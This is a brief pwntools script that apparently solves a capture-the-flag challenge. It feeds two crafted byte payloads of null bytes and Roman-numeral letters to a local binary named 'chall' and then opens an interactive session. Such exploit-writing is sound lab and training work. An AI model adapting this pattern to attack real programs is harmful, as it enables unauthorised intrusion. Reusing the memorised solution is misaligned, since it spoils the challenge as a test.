#!/usr/bin/python3
from audioop import reverse
import pwn

pwn.context.terminal = ['tmux', 'splitw', '-h']

elf = pwn.ELF("./chall")
if pwn.args.GDB:
    io = pwn.gdb.debug(elf.path,gdbscript='b *main+225\n')
else:
    io = elf.process()

payload1 = b'\0' * 6 + b'M' * 5 + b'C' * 1 + b'X' * 6 + b'I' * 4
payload2 = b'\0' * 0 + b'M' * 4 + b'C' * 8 + b'X' * 5 + b'I' * 4
io.sendline(payload1)
io.sendline(payload2)
io.interactive()
